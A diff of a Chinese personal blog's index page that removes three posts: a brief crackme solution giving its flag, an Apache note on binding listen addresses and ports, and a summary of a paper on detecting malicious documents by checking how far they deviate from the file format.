-            <p>首先执行程序，有一个输入框，任意输入一些内容，弹出错误：<br><img src="https://i.loli.net/2019/04/22/5cbdb833ed2ed.png" alt=""></p>
-<p>要破解这个程序，重点就是找到并理解判断输入是否正确的逻辑，于是用IDA查看：<br>搜索字符串找到”Congratulation!!”<br><img src="https://i.loli.net/2019/04/22/5cbdb85febe3a.png" alt=""></p>
-<p>进而定位到关键函数：<br><img src="https://i.loli.net/2019/04/22/5cbdb871a8621.png" alt=""></p>
-<p>分析这个函数可知，输入的构造应该为：’E’ + ‘a’ + a5y + aR3versing</p>
-<p>所以flag就为：<strong>Ea5yR3versing</strong></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/Apache-server配置监听的IP和端口/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xnightmare">
-      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xnightmare's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/22/Apache-server配置监听的IP和端口/" class="post-title-link" itemprop="url">Apache server配置监听的IP和端口</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-04-22 20:34:56" itemprop="dateCreated datePublished" datetime="2019-04-22T20:34:56+08:00">2019-04-22</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-05-12 11:47:06" itemprop="dateModified" datetime="2019-05-12T11:47:06+08:00">2019-05-12</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/杂项/" itemprop="url" rel="index"><span itemprop="name">杂项</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>同一台主机上，有两个web服务，一个服务是对外开放的，而另外一个仅限内部人员使用，需要隔离开来。考虑到使用iptables限制IP访问过于死板，最后决定将内部web服务绑定到IPv6端口上，在其他人不知道IPv6地址的情况下，保证一定的安全性。</p>
-<h3 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h3><p>Apache server可以在主要配置文件<code>httpd.conf</code>中设置网站绑定的IP和端口。<code>httpd.conf</code>文件一般在<code>/etc/httpd/</code>目录下。</p>
-<ol>
-<li><p>可以只绑定IPv4</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listen IPv4_addr:8000</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以只绑定IPv6</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listen [IPv6_addr]:8000</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以同时绑定IPv4和IPv6（两个端口可以不同）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Listen [IPv6_addr]:800</span><br><span class="line">Listen IPv4_addr:8000</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以绑定一个IP的多个端口，所以可以不同IP和端口之间进行混搭，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 同时监听了IPv6地址的800和8000端口和IPv4地址的8000端口</span><br><span class="line">Listen [IPv6_addr]:8000</span><br><span class="line">Listen [IPv6_addr]:800</span><br><span class="line">Listen IPv4_addr:8000</span><br></pre></td></tr></table></figure></li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/O-checker/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xnightmare">
-      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xnightmare's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/08/O-checker/" class="post-title-link" itemprop="url">O-checker</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-04-08 21:15:16" itemprop="dateCreated datePublished" datetime="2019-04-08T21:15:16+08:00">2019-04-08</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-05-12 11:48:38" itemprop="dateModified" datetime="2019-05-12T11:48:38+08:00">2019-05-12</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/论文阅读/" itemprop="url" rel="index"><span itemprop="name">论文阅读</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p><a href="https://pdfs.semanticscholar.org/a592/0643b48b9ff19ed1dbc3d9fdc36aae6502aa.pdf" target="_blank" rel="noopener">O-checker: Detection of Malicious Documents through Deviation from File Format Specifications</a></p>
-</blockquote>
-<h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p><strong>背景：</strong><br>在目标邮件攻击中，攻击者常常会诱导收信人打开恶意邮件附件，从而造成机密信息泄露等一系列危害。恶意邮件附件中，大部分都是文档文件。和可执行文件不同的是，不能通过检查文件扩展名来判断风险。<br><strong>主要内容：</strong><br>o-checker：一种恶意文档文件检测工具。<br><strong>主要思想：</strong><br>检查文档文件和文件规范的偏差。<br><strong>优点：</strong></p>
-<ol>
-<li>速度快。</li>
-<li>稳定性好。在文档中隐藏恶意代码的技术种类相对于恶意代码的种类要少得多，并且文档文件规范比文档处理器也要稳定得多。</li>
-<li><del>准确率高。在实验中，o-checker获得了96.1%的准确率。</del></li>
-</ol>
-<h2 id="恶意文档文件的结构和一般执行过程："><a href="#恶意文档文件的结构和一般执行过程：" class="headerlink" title="恶意文档文件的结构和一般执行过程："></a>恶意文档文件的结构和一般执行过程：</h2><p><img src="/images/2019/04/09/3ec2c5a0-5a7b-11e9-9ef8-256a8585c3df.png" alt="image.png"></p>
-<ul>
-<li>Exploit code：利用文档处理器漏洞的程序。</li>
-<li>Shell code：创建可执行文件和诱饵文档文件，并启动可执行文件。</li>
-<li>Executable file</li>
-<li>Decoy document file<br><img src="/images/2019/04/09/30283750-5a7b-11e9-9ef8-256a8585c3df.png" alt="image.png"></li>
-</ul>
-<h2 id="文档结构"><a href="#文档结构" class="headerlink" title="文档结构"></a>文档结构</h2><h3 id="RTF"><a href="#RTF" class="headerlink" title="RTF"></a>RTF</h3><p>由控制字、控制符和组组成。</p>
-<ul>
-<li><code>{}</code> 定义一个组，组可以嵌套。</li>
-<li><code>\</code> 标识一个RTF控制码</li>
-<li><code>{\rtf ...}</code> 一个有效的RTF文件都包含这样一个组，<code>{</code>是RTF代码的第一个字符，<code>}</code>表示文件结束符。</li>
-</ul>
-<h3 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h3><p>一个包含存储和流的嵌套层次结构的单个文件。与文件结构类比，存储对应目录，流对应文件。<br>物理结构：一个512字节的头部和一些等长的扇区。用一个32位非负整数标识扇区，成为扇区号。一个流被划分存储到多个扇区中。<br>头部中定义了FAT和DE的位置。FAT中定义了扇区链。DE中定义管理名字，大小、流，存储的父子关系。</p>
-<h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><h2 id="异常结构"><a href="#异常结构" class="headerlink" title="异常结构"></a>异常结构</h2><h3 id="AS1（RTF）"><a href="#AS1（RTF）" class="headerlink" title="AS1（RTF）"></a>AS1（RTF）</h3><p>在EOF后附加数据。</p>
-<h3 id="AS2（CFB）"><a href="#AS2（CFB）" class="headerlink" title="AS2（CFB）"></a>AS2（CFB）</h3><p>文件大小异常。</p>
-<h3 id="AS3（CFB）"><a href="#AS3（CFB）" class="headerlink" title="AS3（CFB）"></a>AS3（CFB）</h3><p>数据没有被FAT引用。</p>
-<h3 id="AS4（CFB）"><a href="#AS4（CFB）" class="headerlink" title="AS4（CFB）"></a>AS4（CFB）</h3><p>最后一个扇区是空闲扇区。</p>
-<h3 id="AS5（CFB）"><a href="#AS5（CFB）" class="headerlink" title="AS5（CFB）"></a>AS5（CFB）</h3><p>包含了可执行文件的扇区在扇区层次结构之外。</p>
-<h3 id="AS6"><a href="#AS6" class="headerlink" title="AS6"></a>AS6</h3><h3 id="AS7"><a href="#AS7" class="headerlink" title="AS7"></a>AS7</h3><h3 id="AS8"><a href="#AS8" class="headerlink" title="AS8"></a>AS8</h3>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Page précédente"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Page suivante"></i></a>
   </nav>
 
 
@@ -2131,8 +2137,8 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">40</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-count">46</span>
+                    <span class="site-state-item-name">articles</span>
                   </a>
                 </div>
               
@@ -2163,7 +2169,7 @@
                       
                     
                     <span class="site-state-item-count">8</span>
-                    <span class="site-state-item-name">Kategorien</span>
+                    <span class="site-state-item-name">categories</span>
                   
                 </div>
               
@@ -2210,7 +2216,7 @@
                       
                     
                     <span class="site-state-item-count">16</span>
-                    <span class="site-state-item-name">schlagwörter</span>
+                    <span class="site-state-item-name">tags</span>
                   
                 </div>
               
@@ -2263,7 +2269,7 @@
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
 
 
 
@@ -2271,7 +2277,7 @@
 
 
 
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>
+  <div class="theme-info">Thème – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>
 
 
 
